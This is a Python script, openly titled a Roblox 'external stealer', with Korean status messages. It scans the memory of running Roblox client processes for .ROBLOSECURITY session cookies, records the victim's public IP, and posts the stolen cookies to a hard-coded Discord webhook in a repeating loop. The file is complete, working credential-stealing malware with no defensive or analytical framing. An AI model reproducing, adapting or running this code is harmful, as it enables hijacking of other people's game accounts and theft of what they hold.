# roblox_external_stealer.py
# pip install pymem requests psutil

import ctypes
import ctypes.wintypes as wintypes
import re
import time
import requests
import psutil
from pymem import Pymem

WEBHOOK = "https://discord.com/api/webhooks/1576000702847779059/CHJMsZrL7SPh5q4cV5NNchURwP5YtxoYhIGqTRTsrtj_mNQqwMjKKGKgD92yEg-E8oYd"
PROCESS_NAMES = [
    "RobloxPlayerBeta.exe",
    "RobloxPlayerBeta",
    "Windows10Universal.exe",
]
SCAN_INTERVAL = 8

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

COOKIE_PATTERN = re.compile(
    rb'\.ROBLOSECURITY[_=:\s]*(_\|WARNING:-DO-NOT-SHARE-THIS\.[^\x00-\x1f\x7f-\xff]{20,800})',
    re.IGNORECASE
)
COOKIE_PATTERN_LOOSE = re.compile(
    rb'(_\|WARNING:-DO-NOT-SHARE-THIS\.[A-Za-z0-9\+/=_\-\.]{30,900})'
)

def get_exit_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except Exception:
        return "unknown"

def find_roblox_pids():
    pids = []
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            name = proc.info["name"] or ""
            if any(n.lower() in name.lower() for n in PROCESS_NAMES):
                pids.append(proc.info["pid"])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return pids

def read_memory_regions(pm: Pymem):
    address = 0
    max_addr = 0x7FFFFFFFFFFF
    mbi = wintypes.MEMORY_BASIC_INFORMATION()

    while address < max_addr:
        result = kernel32.VirtualQueryEx(
            pm.process_handle,
            ctypes.c_void_p(address),
            ctypes.byref(mbi),
            ctypes.sizeof(mbi)
        )
        if result == 0:
            break

        if (mbi.State == 0x1000 and
            mbi.Protect in (0x04, 0x20, 0x40, 0x80) and
            mbi.RegionSize > 0):
            try:
                data = pm.read_bytes(address, min(mbi.RegionSize, 8 * 1024 * 1024))
                yield address, data
            except Exception:
                pass

        address += mbi.RegionSize

def extract_cookies(data: bytes):
    found = set()
    for m in COOKIE_PATTERN.finditer(data):
        found.add(m.group(1).decode("utf-8", errors="ignore"))
    if not found:
        for m in COOKIE_PATTERN_LOOSE.finditer(data):
            found.add(m.group(1).decode("utf-8", errors="ignore"))
    return list(found)

def scan_process(pid: int):
    try:
        pm = Pymem()
        pm.open_process_from_id(pid)
    except Exception as e:
        return None, f"open failed: {e}"

    cookies = []
    try:
        for addr, region in read_memory_regions(pm):
            hits = extract_cookies(region)
            for c in hits:
                if c not in cookies:
                    cookies.append(c)
            if len(cookies) >= 3:
                break
    except Exception as e:
        return None, f"scan error: {e}"
    finally:
        try:
            pm.close_process()
        except Exception:
            pass

    return cookies, None

def send_result(payload: dict):
    try:
        requests.post(WEBHOOK, json=payload, timeout=8)
    except Exception:
        pass

def main():
    print("[zzmop] roblox external stealer 시작")
    seen = set()

    while True:
        pids = find_roblox_pids()
        if not pids:
            print("[zzmop] Roblox 프로세스 없음 — 대기중")
            time.sleep(SCAN_INTERVAL)
            continue

        exit_ip = get_exit_ip()

        for pid in pids:
            if pid in seen:
                continue

            print(f"[zzmop] PID {pid} 스캔 중...")
            cookies, err = scan_process(pid)

            if err:
                print(f"[zzmop] 에러: {err}")
                continue

            if cookies:
                payload = {
                    "type": "roblox_cookie",
                    "time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "pid": pid,
                    "exit_ip": exit_ip,
                    "cookies": cookies,
                    "count": len(cookies)
                }
                send_result(payload)
                print(f"[zzmop] 쿠키 {len(cookies)}개 발견 → 웹훅 전송")
                for c in cookies:
                    print(f"    {c[:60]}...")
                seen.add(pid)
            else:
                print(f"[zzmop] PID {pid} 에서 쿠키 못 찾음")

        time.sleep(SCAN_INTERVAL)

if __name__ == "__main__":
    main()
